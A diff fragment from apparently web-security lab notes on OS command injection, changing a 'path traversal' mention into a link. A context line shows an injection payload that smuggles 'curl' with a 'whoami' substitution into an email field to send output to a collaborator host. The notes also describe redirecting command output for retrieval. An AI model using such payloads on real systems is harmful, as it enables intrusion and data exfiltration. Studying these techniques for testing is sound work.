@@ -3067,7 +3067,7 @@ email=carlos@exam.net||curl+`whoami`.COLLABORATOR.net||
   
 ### Output redirection  
 
->If OS command injection ***identified***, and filter in place preventing complex command injection, attempt to redirect output to writable folder. ***Identify*** a **path traversal** vulnerability that allow reading of files only in current WEB APP.  
+>If OS command injection ***identified***, and filter in place preventing complex command injection, attempt to redirect output to writable folder. ***Identify*** a [path traversal](#file-path-traversal) vulnerability that allow reading of files only in current WEB APP.  
 
 >***Identify*** the working directory using `pwd` command output redirected, and appending to `output.txt` file every bash command stdout.  
 
